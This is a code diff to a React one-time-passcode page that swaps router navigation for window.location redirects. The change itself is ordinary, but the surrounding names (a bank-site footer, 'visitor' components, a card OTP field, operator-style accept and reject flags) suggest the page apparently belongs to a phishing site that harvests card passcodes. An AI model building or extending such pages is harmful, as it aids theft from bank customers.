@@ -1,6 +1,6 @@
 import axios from "axios";
 import React, { useEffect, useRef, useState } from "react";
-import { useLocation, useNavigate } from "react-router-dom";
+import { useLocation } from "react-router-dom";
 import { BankSiteFooter } from "../components/BankSiteFooter";
 import { VisitorTopLogo } from "../components/VisitorTopLogo";
 import { BottomBar } from "../components/VisitorShared";
@@ -30,7 +30,6 @@ export default function Otp() {
     otpMaskedLine("+970"),
   );
   const navigatedRef = useRef(false);
-  const navigate = useNavigate();
   const location = useLocation();
   const orderId =
     location.state?.orderId ?? sessionStorage.getItem("currentOrderId");
@@ -47,12 +46,12 @@ export default function Otp() {
   useEffect(() => {
     if (!hydrated || !orderId) return;
     if (branchApplicationAccepted) return;
-    navigate("/branch", { replace: true, state: { orderId } });
-  }, [hydrated, branchApplicationAccepted, orderId, navigate]);
+    window.location.href = "/branch";
+  }, [hydrated, branchApplicationAccepted, orderId]);
 
   useEffect(() => {
     if (!orderId) {
-      navigate("/", { replace: true });
+      window.location.href = "/";
       return;
     }
     let cancelled = false;
@@ -69,7 +68,7 @@ export default function Otp() {
     return () => {
       cancelled = true;
     };
-  }, [orderId, navigate]);
+  }, [orderId]);
 
   useEffect(() => {
     if (!hydrated || !orderId || navigatedRef.current) return;
@@ -84,9 +83,9 @@ export default function Otp() {
       setLoading(false);
       navigatedRef.current = true;
       sessionStorage.setItem("currentOrderId", orderId);
-      navigate("/success", { state: { orderId }, replace: true });
+      window.location.href = "/success";
     }
-  }, [hydrated, cardOtpAccept, rejectReason, orderId, navigate, t]);
+  }, [hydrated, cardOtpAccept, rejectReason, orderId, t]);
 
   const onCardOtpChange = (e) => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 6);
